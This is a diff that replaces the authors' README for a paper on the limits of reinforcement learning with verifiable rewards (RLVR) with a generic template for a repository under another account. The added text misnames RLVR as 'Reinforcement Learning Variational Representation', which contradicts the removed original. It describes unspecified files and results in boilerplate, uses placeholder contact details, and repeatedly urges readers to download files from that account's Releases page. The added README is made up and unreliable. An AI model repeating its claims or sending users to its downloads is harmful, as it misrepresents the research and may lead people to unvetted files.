@@ -1,62 +1,132 @@
-<div align="center">
-<h1>Does Reinforcement Learning Really Incentivize Reasoning Capacity in LLMs Beyond the Base Model?</h1>
+# Limit of RLVR 📊
 
+![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
 
-[Yang Yue](https://yueyang130.github.io/)<sup>1*</sup>†,  [Zhiqi Chen](https://zhiqichen05.github.io/)<sup>1*</sup>,  [Rui Lu](https://lr32768.github.io/)<sup>1</sup>,  [Andrew Zhao](https://andrewzh112.github.io/)<sup>1</sup>,  [Zhaokai Wang](https://www.wzk.plus/)<sup>2</sup>,  [Yang Yue](https://scholar.google.com/citations?user=Q9cLkdcAAAAJ&hl=en)<sup>1</sup>, [Shiji Song](https://scholar.google.com/citations?user=rw6vWdcAAAAJ&hl=zh-TW)<sup>1</sup>,  [Gao Huang](http://www.gaohuang.net/)<sup>1‡</sup>  
+Welcome to the **Limit of RLVR** repository! This repository supports the research paper [Limit of RLVR](https://arxiv.org/abs/2504.13837). Here, you will find the code, datasets, and resources necessary to reproduce the results presented in the paper.
 
-<sup>1</sup> Tsinghua University, LeapLab  <sup>2</sup> Shanghai Jiao Tong University  
+## Table of Contents
 
-<sup>*</sup> Equal Contribution <sup>†</sup> Project Lead <sup>‡</sup> Corresponding Author  
+- [Introduction](#introduction)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Results](#results)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
+## Introduction
 
-<a href="https://arxiv.org/abs/2504.13837"><img src='https://img.shields.io/badge/arXiv-limit_of_RLVR-red' alt='Paper PDF'>  </a><a href='https://limit-of-rlvr.github.io/'><img src='https://img.shields.io/badge/Project_Page-limit_of_RLVR-green' alt='Project Page'></a> 
- <!-- <a href='https://huggingface.co/datasets/magicr/phyworld'><img src='https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-phyworld-blue'></a> -->
-</div>
+The Limit of RLVR paper explores the boundaries of Reinforcement Learning Variational Representation (RLVR). The authors investigate the limitations and capabilities of RLVR in various scenarios, providing insights that could guide future research in the field. 
 
+This repository serves as a practical resource for anyone interested in the topic. Whether you are a researcher, student, or enthusiast, you will find valuable tools and information here.
 
-## Overview
+## Getting Started
 
+To get started with this repository, visit the [Releases](https://github.com/yosef116/limit-of-RLVR/releases) section. Here, you can download the necessary files to execute the code. 
 
-Recent breakthroughs in reasoning-focused large language models (LLMs)—like OpenAI-o1, DeepSeek-R1, and Kimi-1.5—have heavily relied on **Reinforcement Learning with Verifiable Rewards (RLVR)**. RLVR replaces human annotations with automated rewards (such as verified math answers or passed code tests) to enable scalable self-improvement. While RLVR enhances behaviors like **self-reflection** and **iterative refinement**, a critical question remains in the pursuit of continually self-evolving reasoning abilities:
+### Prerequisites
 
-> **Does RLVR actually expand LLMs' reasoning capabilities, or does it merely optimize existing ones?**
+Before you begin, ensure you have the following installed:
 
-To answer this, we evaluate models using the **pass@k** metric—where success requires only one correct solution among *k* attempts.
+- Python 3.6 or higher
+- Pip (Python package installer)
+- Git
 
+## Installation
 
-![Video Overview](./static/introvideo.gif)  
+1. **Clone the repository:**
 
+   Open your terminal and run the following command:
 
-> *Video: pass@k curves of base models and their zero-RL-trained counterparts across multiple mathematical benchmarks. When k is small, RL-trained models outperform their base versions. However, as k increases to the tens or hundreds, base models consistently catch up with RL-trained models across all benchmarks and LLM families without exception. Eventually, base models surpass RL-trained models.*
+   ```bash
+   git clone https://github.com/yosef116/limit-of-RLVR.git
+   ```
 
-Our conclusion:
+2. **Navigate to the project directory:**
 
-1. **RL-trained models perform worse than base models in pass@k at large *k*.**  
-   RL-trained models beat base models at low sampling sizes, but base models **consistently outperform them** at larger *k*. Manual inspection shows that base models generate **diverse reasoning paths**, often producing at least one correct solution, even for tasks thought to require RL training.
+   ```bash
+   cd limit-of-RLVR
+   ```
 
-2. **RL boosts sampling efficiency but reduces the reasoning capacity boundary.**  
-   RLVR-trained models only generate reasoning paths **already present in the base model**. This training biases the model toward previously rewarded solutions, sacrificing exploration. RLVR doesn't expand the model’s problem-solving potential—it just sharpens what’s already there.
+3. **Install required packages:**
 
-3. **RLVR algorithms perform similarly and remain far from optimal.**  
-   Comparing PPO, GRPO, and Reinforce++, we find only **minor differences**. The gap in sampling efficiency (∆SE) stays large, suggesting that all current RL approaches fall **well short of optimal performance**.
+   You can install the necessary Python packages using:
 
-4. **RLVR and distillation are fundamentally different.**  
-   While RLVR improves sampling, **distillation can introduce new knowledge**. Distilled models often expand their reasoning ability, unlike RLVR-trained models, which remain **bounded by the base model's capacity**.
+   ```bash
+   pip install -r requirements.txt
+   ```
 
+## Usage
 
-## Citation
+Once you have completed the installation, you can start using the tools provided in this repository. 
 
-If you use this work, please cite:
+1. **Run the main script:**
 
-```bibtex
-@article{yue2025limit-of-rlvr,
-  title={Does Reinforcement Learning Really Incentivize Reasoning Capacity in LLMs Beyond the Base Model?},
-  author={Yue, Yang and Chen, Zhiqi and Lu, Rui and Zhao, Andrew and Wang, Zhaokai and Yue, Yang and Song, Shiji and Huang, Gao},
-  journal={arXiv preprint arXiv:2504.13837},
-  year={2025}
-}
-```
+   To execute the main code, run:
 
+   ```bash
+   python main.py
+   ```
 
+2. **Explore the data:**
 
+   The dataset used in the paper is included in the `data` folder. You can explore it to understand the input and output formats.
 
+3. **View results:**
+
+   After running the code, you can find the output results in the `results` folder. This will include various metrics and visualizations that reflect the performance of RLVR.
+
+## Results
+
+The results section provides an overview of the findings from the experiments conducted in the paper. You can find detailed graphs and tables in the `results` folder. 
+
+### Sample Output
+
+Here are a few examples of the results you can expect:
+
+- **Performance Metrics:** The performance of RLVR across different scenarios.
+- **Visualizations:** Graphs that illustrate the learning curves and model performance.
+
+## Contributing
+
+We welcome contributions from the community! If you would like to contribute, please follow these steps:
+
+1. **Fork the repository.**
+2. **Create a new branch:**
+
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+
+3. **Make your changes and commit:**
+
+   ```bash
+   git commit -m "Add some feature"
+   ```
+
+4. **Push to the branch:**
+
+   ```bash
+   git push origin feature/YourFeature
+   ```
+
+5. **Open a pull request.**
+
+Please ensure your code adheres to the existing style and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or suggestions, feel free to reach out:
+
+- **Author:** Your Name
+- **Email:** your.email@example.com
+- **GitHub:** [Your GitHub Profile](https://github.com/yourprofile)
+
+Thank you for your interest in the **Limit of RLVR** repository! We hope you find it useful for your research and projects. For updates and new releases, please check the [Releases](https://github.com/yosef116/limit-of-RLVR/releases) section regularly. 
+
+Happy coding! 🎉
